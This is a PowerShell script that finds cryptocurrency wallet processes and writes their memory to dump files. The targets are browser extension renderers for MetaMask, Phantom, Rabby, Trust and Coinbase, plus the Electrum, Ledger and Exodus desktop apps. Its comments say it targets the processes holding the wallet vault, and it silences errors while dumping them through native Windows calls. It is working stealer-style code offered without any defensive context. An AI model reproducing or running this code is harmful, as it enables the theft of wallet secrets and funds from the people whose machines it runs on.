param(
    [Parameter(Mandatory = $true)][string]$Name,
    [Parameter(Mandatory = $true)][string]$Target,
    [Parameter(Mandatory = $true)][string]$OutDir,
    [Parameter(Mandatory = $true)][string]$OutList,
    [string]$Tag = ''
)

$ErrorActionPreference = 'SilentlyContinue'
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
$utf8 = New-Object -TypeName System.Text.UTF8Encoding -ArgumentList $false

function Add-Line([string]$value) {
    [IO.File]::AppendAllText($OutList, $value + [Environment]::NewLine, $utf8)
}

Add-Type @'
using System;
using System.Runtime.InteropServices;
public static class SpcDump {
    [DllImport("dbghelp.dll")] public static extern bool MiniDumpWriteDump(
        IntPtr process, uint pid, IntPtr file, uint type, IntPtr exception,
        IntPtr user, IntPtr callback);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(
        uint access, bool inherit, uint pid);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr handle);
}
'@

function Get-SafeProcess([int]$processId) {
    try { return Get-Process -Id $processId } catch { return $null }
}

$candidates = @()
if ($Name -in @('phantom', 'metamask', 'rabby', 'trust', 'coinbase')) {
    # Browser extensions run in an extension renderer, never in the browser main process.
    $all = @(Get-CimInstance Win32_Process)
    $root = 0
    if ($Target -match '^\d+$') {
        $selected = $all | Where-Object { $_.ProcessId -eq [int]$Target }
        if ($selected -and $selected.Name -match '(?i)chrome|msedge|brave') {
            $root = [int]$Target
        } elseif ($selected) {
            # The foreground window may be the extension popup renderer itself;
            # its extension siblings (the ones holding the vault) hang off the browser.
            $parent = $all | Where-Object { $_.ProcessId -eq [int]$selected.ParentProcessId }
            if ($parent -and $parent.Name -match '(?i)chrome|msedge|brave') {
                $root = [int]$parent.ProcessId
            }
        }
    }
    $roots = @()
    if ($root -gt 0) {
        $roots = @($root)
    } else {
        $roots = @($all | Where-Object { $_.Name -match '(?i)chrome|msedge|brave' } |
            Select-Object -ExpandProperty ProcessId)
    }
    $extension = @($all | Where-Object {
        $_.ParentProcessId -in $roots -and $_.CommandLine -match '--extension-process'
    })
    if ($extension.Count -eq 0) {
        $extension = @($all | Where-Object {
            $_.ParentProcessId -in $roots -and $_.CommandLine -match '--type=renderer'
        })
    }
    if ($Target -match '^\d+$') {
        $self = $all | Where-Object { $_.ProcessId -eq [int]$Target }
        if ($self -and $self.CommandLine -match '--type=renderer') {
            $extension = @($self) + $extension
        }
    }
    foreach ($item in $extension) {
        $process = Get-SafeProcess ([int]$item.ProcessId)
        if ($process) { $candidates += $process }
    }
} elseif ($Target -match '^\d+$') {
    $process = Get-SafeProcess ([int]$Target)
    if ($process) { $candidates += $process }
} else {
    $filtered = Get-CimInstance Win32_Process | Where-Object {
        if ($Name -eq 'electrum') {
            $_.Name -match '(?i)^electrum' -or ($_.Name -match '(?i)^python' -and $_.CommandLine -match '(?i)electrum')
        } elseif ($Name -eq 'ledger') {
            $_.Name -match '(?i)^ledger'
        } elseif ($Name -eq 'exodus') {
            $_.Name -match '(?i)^exodus'
        } elseif ($Name -eq 'metamask' -or $Name -eq 'rabby') {
            $_.CommandLine -match '--extension-process'
        } else {
            $_.Name -match "(?i)$Name"
        }
    }
    foreach ($item in $filtered) {
        $process = Get-SafeProcess ([int]$item.ProcessId)
        if ($process) { $candidates += $process }
    }
}

$seen = @{}
$count = 0
foreach ($process in ($candidates | Sort-Object WorkingSet64 -Descending)) {
    if ($seen.ContainsKey($process.Id)) { continue }
    $seen[$process.Id] = 1
    if ($count -ge 2) { break }
    $count++

    $size = [int64]$process.WorkingSet64
    if ($size -gt 1610612736) {
        Add-Line ("BIG|{0}|{1}" -f $process.Id, [int]($size / 1MB))
        continue
    }

    $prefix = if ($Tag) { "wallet-$Tag-$Name" } else { "wallet-$Name" }
    $path = Join-Path $OutDir ("{0}-{1}-{2}.dmp" -f $prefix, $process.Id, (Get-Date -Format yyyyMMddHHmmss))
    $handle = [SpcDump]::OpenProcess(0x0410, $false, [uint32]$process.Id)
    if ($handle -eq [IntPtr]::Zero) { continue }
    $stream = [IO.File]::Create($path)
    $ok = [SpcDump]::MiniDumpWriteDump($handle, [uint32]$process.Id,
        $stream.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    $stream.Close()
    [SpcDump]::CloseHandle($handle)
    if ($ok) {
        Add-Line $path
    } else {
        Remove-Item -LiteralPath $path -Force
    }
}
